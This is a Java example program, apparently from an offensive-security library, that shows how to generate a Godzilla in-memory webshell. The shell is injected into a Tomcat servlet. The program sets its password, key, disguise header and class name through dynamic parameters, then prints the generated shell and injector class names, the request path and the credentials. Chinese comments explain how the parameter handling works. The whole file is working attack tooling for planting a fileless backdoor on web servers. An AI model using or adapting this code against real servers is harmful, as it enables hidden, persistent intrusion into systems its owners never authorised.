package com.reajason.javaweb.examples.memshell;

import com.reajason.javaweb.Server;
import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaConfig;

import java.util.LinkedHashMap;
import java.util.Map;

/**
 * 动态参数写法：GUI、REST、MCP 都走这条路径。参数名就是工具 config 的 {@code @ConfigField}
 * 字段名（另外加一个生成期参数 {@code shellClassName}），调用方不需要依赖具体的工具模块。
 * <p>
 * 留空的参数跳过（使用 builder 默认值，例如随机 pass/key）；写了不存在的参数名会抛
 * {@code GenerationException}，避免拼写错误被静默吞掉。
 *
 * @author ReaJason
 * @since 2026/10/22
 */
public class DynamicParams {
    public static void main(String[] args) {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("pass", "pass");
        params.put("key", "key");
        // headerName 不传：GodzillaConfig 默认 User-Agent
        params.put("headerValue", "Mozilla/5.0");
        params.put("shellClassName", "com.example.memshell.DemoGodzilla");

        MemShellResult result = new MemShellGenerator().generate(
                ShellConfig.builder()
                        .server(Server.Tomcat)
                        .shellTool(ShellTool.Godzilla)
                        .shellType(ShellType.SERVLET)
                        .build(),
                InjectorConfig.builder().build(),
                params);

        GodzillaConfig generated = (GodzillaConfig) result.getShellToolConfig();
        System.out.println("shell 类：" + result.getShellClassName());
        System.out.println("注入器类：" + result.getInjectorClassName());
        System.out.println("请求路径：" + result.getInjectorConfig().getUrlPattern());
        System.out.println("pass = " + generated.getPass());
        System.out.println("key = " + generated.getKey());
        System.out.println(generated.getHeaderName() + " = " + generated.getHeaderValue());
    }
}
